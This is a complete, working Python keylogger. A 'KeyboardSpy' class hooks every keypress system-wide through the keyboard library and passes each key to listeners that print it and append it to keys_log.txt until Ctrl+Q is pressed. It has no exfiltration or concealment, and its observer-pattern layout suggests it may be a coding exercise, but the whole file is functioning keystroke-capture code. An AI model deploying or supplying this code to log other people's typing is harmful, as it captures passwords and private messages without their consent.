import keyboard

class KeyboardListener:
    def on_press(self, event):
        pass

class KeyLogger(KeyboardListener):
    def on_press(self, event):
        print(event.name)

class KeyFileLogger(KeyboardListener):
    def __init__(self, filename):
        self.filename = filename

    def on_press(self, event):
        with open(self.filename, "a", encoding="utf-8") as file:
            file.write(event.name + "\n")

class KeyboardSpy:
    def __init__(self):
        self.listeners = []

    def add_listener(self, listener):
        self.listeners.append(listener)

    def trigger_listeners(self, event):
        for listener in self.listeners:
            listener.on_press(event)

    def start(self):
        keyboard.on_press(self.trigger_listeners)
        keyboard.wait("ctrl+q")

spy = KeyboardSpy()

logger_console = KeyLogger()
logger_file = KeyFileLogger("keys_log.txt")

spy.add_listener(logger_console)
spy.add_listener(logger_file)

spy.start()